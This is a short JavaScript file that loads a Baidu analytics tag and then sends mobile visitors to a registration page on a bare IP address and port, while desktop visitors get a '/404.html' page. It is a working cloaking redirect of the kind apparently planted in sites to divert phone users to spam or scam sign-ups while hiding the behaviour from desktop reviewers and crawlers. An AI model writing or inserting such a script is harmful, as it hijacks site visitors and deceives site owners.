var _hmt = _hmt || [];
(function () {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?db06e66ab0a6c309d5c065e27df2663f";
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
})();
if((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
	//var arr = ["http://jytyvip01.com", "http://jytyvip01.com"];
	var arr = ["https://35.194.228.102:11573/register", "https://35.194.228.102:11573/register"];
	window.location.href = arr[parseInt(Math.random() * arr.length)];
}else{
	window.location.href="/404.html";
}
